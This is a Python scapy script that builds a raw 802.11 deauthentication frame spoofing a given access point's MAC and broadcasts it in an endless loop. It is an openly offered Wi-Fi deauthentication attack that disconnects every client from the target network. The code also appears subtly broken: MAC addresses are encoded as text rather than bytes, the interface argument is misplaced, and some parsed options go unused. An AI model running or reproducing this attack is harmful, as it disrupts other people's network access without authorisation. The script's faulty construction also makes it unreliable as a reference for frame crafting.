#!/usr/bin/sudo /usr/bin/python3

from threading import Thread
from scapy.all import *
import sys

argv=sys.argv
iface=argv[1]
ap_mac=argv[2]

if "-auth" in argv:
    auth_flag=True
    if len(argv)==5:
        station_mac=argv[4]
else:
    if len(argv)==4:
        station_mac=argv[3]

class RadioTopHeader():
    def __init__(self):
        self.header_revision=b"\x00"
        self.header_pad=b"\x00"
        self.header_len=b"\x18\x00"
        self.present_flags=b"\x00"*6
        self.flags=b"\x00"
        self.data_rate=b"\x00"
        self.ch_frequency=b"\x00\x00"
        self.ch_flags=b"\x00\x00"
        self.anthenna_signal=b"\x00"
        self.anthenna=b"\x00"

class DeauthFrame():
    def __init__(self):
        self.type=b"\xc0\x00"
        self.duration=b"\x00\x00"
        self.dst_addr=b"\x00"*6
        self.src_addr=b"\x00"*6
        self.bss=b"\x00"*6
        self.seq=b"\x00"*2

class Packet():
    def __init__(self):
        self.rt_header=RadioTopHeader()
        self.deauth_frame=DeauthFrame()
        self.wireless_mgmt=b"\x03\x00"
    def raw(self):
        raw=b""
        rt_header_data=vars(self.rt_header)
        for i in vars(self.rt_header):
            raw+=rt_header_data[i]

        deauth_frame_data=vars(self.deauth_frame)
        for i in vars(self.deauth_frame):
            raw+=deauth_frame_data[i]
        
        raw+=self.wireless_mgmt
        return raw

p=Packet()

p.deauth_frame.src_addr=ap_mac.encode('utf-8')
p.deauth_frame.dst_addr=b"\xff\xff\xff\xff\xff\xff"
p.deauth_frame.bss=ap_mac.encode('utf-8')

raw_packet=p.raw()
print(raw_packet)
sendp(raw_packet,iface,loop=1,inter=0.1)
